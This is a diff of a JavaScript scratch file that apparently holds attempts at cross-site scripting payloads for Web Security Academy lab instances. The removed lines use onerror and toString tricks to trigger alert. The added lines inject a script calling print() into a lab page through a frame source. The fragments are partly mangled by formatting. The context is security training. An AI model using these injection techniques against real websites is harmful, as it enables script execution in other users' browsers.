@@ -1,53 +1,9 @@
-fetch(
-  '/analytics',
-  { method: 'post', body: '/post%3fpostId%3d5' },
-  (x = () => {
-    onerror = alert;
-    throw 1;
-  }),
-  (toString = x),
-  window + 1,
-  ''
-).finally(_ => (window.location = '/'));
+src = '//0a15009c03fb988e8044cb2000f10094.web-security-academy.net/product?productId=1&'>
+https: <script>print()</script>;
 
-fetch('/analytics', { method: 'post', body: '/post%3fpostId%3d4&' }).finally(
-  _ => (window.location = '/')
-);
-
-fetch(
-  '/analytics',
-  { method: 'post', body: '/post?postId=4&' },
-  (x = _ => {
-    onerror = alert;
-    throw 1;
-  }),
-  (toString = x),
-  { '': '' }
-).finally(_ => (window.location = '/'));
-
-fetch(
-  '/analytics',
-  { method: 'post', body: '/post?postId=4&' },
-  (x = _ => {
-    onerror = alert;
-    throw 1;
-  }),
-  (toString = x),
-  { '': '' }
-).finally(_ => (window.location = '/'));
-
-_ => {
-  onerror = alert;
-  throw 1;
-};
-
-fetch(
-  'endpoint',
-  (x = _ => {
-    onerror = alert;
-    throw 1;
-  }),
-  (toString = x),
-  window + 1,
-  { '': '' }
-);
+onload = '';
+if (!window.x) {
+  this.src =
+    'https://0a15009c03fb988e8044cb2000f10094.web-security-academy.net/';
+}
+window.x = 1;
